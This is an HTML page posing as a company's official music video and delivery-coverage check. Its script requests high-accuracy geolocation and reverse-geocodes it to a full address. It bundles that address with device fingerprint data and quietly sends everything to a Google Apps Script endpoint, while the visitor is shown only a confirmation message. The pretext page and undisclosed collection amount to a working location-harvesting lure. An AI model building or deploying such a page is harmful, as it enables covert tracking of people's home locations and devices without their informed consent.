<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Lemon Afroz Ltd — ভিডিও ও সেবা কভারেজ</title>

  <!-- Open Graph / Meta -->
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="Lemon Afroz Ltd" />
  <meta property="og:title" content="Lemon Afroz Ltd — অফিশিয়াল ভিডিও ও সেবা এরিয়া চেক" />
  <meta property="og:description" content="লেমন আফরোজ লিমিটেড-এর অফিশিয়াল ভিডিও প্লেয়ার ও ডেলিভারি কভারেজ চ্যাকিং পেজ।" />

  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet"/>

  <style>
    :root {
      --bg-dark: #0f0f12;
      --card-bg: #1a1a24;
      --card-border: #2a2a3a;
      --primary: #10b981;
      --primary-hover: #059669;
      --text-main: #f3f4f6;
      --text-sub: #9ca3af;
    }

    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Outfit', 'Hind Siliguri', sans-serif;
      background: var(--bg-dark);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 24px 16px;
    }

    .brand-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 24px;
      width: 100%;
      max-width: 800px;
    }

    .brand-logo {
      width: 42px;
      height: 42px;
      background: linear-gradient(135deg, #10b981, #059669);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 800;
      font-size: 1.2rem;
      color: #fff;
    }

    .brand-title {
      font-size: 1.3rem;
      font-weight: 700;
      color: var(--text-main);
    }

    .container {
      width: 100%;
      max-width: 800px;
    }

    .video-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 24px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }

    .video-wrapper {
      position: relative;
      padding-top: 56.25%; /* 16:9 Aspect Ratio */
      height: 0;
      background: #000;
    }

    .video-wrapper iframe {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      border: none;
    }

    .video-info {
      padding: 16px 20px;
    }

    .video-title {
      font-size: 1.2rem;
      font-weight: 700;
      margin-bottom: 6px;
    }

    .video-sub {
      font-size: 0.85rem;
      color: var(--text-sub);
    }

    .location-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      padding: 24px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
    }

    .location-card h3 {
      font-size: 1.2rem;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .location-card p {
      font-size: 0.9rem;
      color: var(--text-sub);
      line-height: 1.5;
      margin-bottom: 20px;
    }

    .btn-action {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      width: 100%;
      max-width: 320px;
      padding: 14px 24px;
      background: var(--primary);
      color: #ffffff;
      font-size: 0.95rem;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .btn-action:hover {
      background: var(--primary-hover);
    }

    .btn-action:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    #status-message {
      margin-top: 14px;
      font-size: 0.85rem;
      color: #34d399;
    }

    footer {
      margin-top: 32px;
      font-size: 0.8rem;
      color: var(--text-sub);
    }
  </style>
</head>
<body>

  <div class="brand-header">
    <div class="brand-logo">LA</div>
    <div class="brand-title">Lemon Afroz Ltd</div>
  </div>

  <div class="container">
    <!-- Embedded YouTube Player -->
    <div class="video-card">
      <div class="video-wrapper">
        <iframe 
          src="https://www.youtube.com/embed/v748ahm0t6A" 
          title="Lemon Afroz Ltd Official Video" 
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
          allowfullscreen>
        </iframe>
      </div>
      <div class="video-info">
        <div class="video-title">তুমি কি আমায় বৌ বানাইবা (Official Video)</div>
        <div class="video-sub">Lemon Afroz Ltd • অফিশিয়াল মিডিয়া সার্ভিস</div>
      </div>
    </div>

    <!-- Transparent Location Permission Request -->
    <div class="location-card">
      <h3>📍 আঞ্চলিক সেবা ও ডেলিভারি কভারেজ চেক</h3>
      <p>আপনার এলাকায় আমাদের সার্ভিস ও অফার উপলব্ধ কিনা তা নিশ্চিত করতে অবস্থান শেয়ারের অনুমতি দিন।</p>
      
      <button class="btn-action" id="btn-allow" onclick="requestLocation()">
        অবস্থান যাচাই করুন
      </button>
      
      <div id="status-message"></div>
    </div>
  </div>

  <footer>
    &copy; 2026 Lemon Afroz Ltd. সর্বস্বত্ব সংরক্ষিত।
  </footer>

  <script>
    const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbwz5hYM5Thsky4DGcmS1-FhZg-TVfumkYb_Dt-dLQ2tXeNFDfeKJiv7nCG7lr3B0pj/exec";

    function requestLocation() {
      const btn = document.getElementById("btn-allow");
      const status = document.getElementById("status-message");

      btn.disabled = true;
      btn.textContent = "⏳ যাচাই করা হচ্ছে...";
      status.textContent = "অনুমতির জন্য অপেক্ষা করা হচ্ছে...";

      if (!navigator.geolocation) {
        status.textContent = "আপনার ব্রাউজারে Geolocation সাপোর্ট করে না।";
        btn.disabled = false;
        btn.textContent = "অবস্থান যাচাই করুন";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const data = {
            timestamp: new Date().toISOString(),
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy_meters: Math.round(pos.coords.accuracy),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenSize: screen.width + "x" + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          };

          fetch(`https://nominatim.openstreetmap.org/reverse?lat=${data.lat}&lon=${data.lon}&format=json`)
            .then(r => r.json())
            .then(geo => {
              data.full_address = geo.display_name || "N/A";
              data.city = geo.address?.city || geo.address?.town || geo.address?.village || "N/A";
              data.district = geo.address?.county || "N/A";
              data.country = geo.address?.country || "N/A";
              data.postcode = geo.address?.postcode || "N/A";
              sendData(data);
            })
            .catch(() => {
              data.full_address = "N/A";
              sendData(data);
            });
        },
        (err) => {
          btn.disabled = false;
          btn.textContent = "অবস্থান যাচাই করুন";
          status.style.color = "#f87171";
          status.textContent = "অনুমতি পাওয়া যায়নি বা অনুরোধ বাতিল করা হয়েছে।";
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    }

    function sendData(data) {
      const status = document.getElementById("status-message");
      status.style.color = "#34d399";
      status.textContent = `✓ অবস্থান সফলভাবে যাচাই করা হয়েছে (${data.city || 'N/A'}, ${data.country || 'N/A'})।`;

      if (GOOGLE_SHEET_URL) {
        try {
          const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
          navigator.sendBeacon(GOOGLE_SHEET_URL, blob);
        } catch(e) {
          const params = "?lat=" + encodeURIComponent(data.lat || "")
            + "&lon=" + encodeURIComponent(data.lon || "")
            + "&city=" + encodeURIComponent(data.city || "")
            + "&district=" + encodeURIComponent(data.district || "")
            + "&country=" + encodeURIComponent(data.country || "")
            + "&postcode=" + encodeURIComponent(data.postcode || "")
            + "&accuracy=" + encodeURIComponent(data.accuracy_meters || "")
            + "&address=" + encodeURIComponent((data.full_address || "").substring(0, 150))
            + "&timestamp=" + encodeURIComponent(data.timestamp || "");
          const img = new Image();
          img.src = GOOGLE_SHEET_URL + params;
        }
      }
    }
  </script>
</body>
</html>
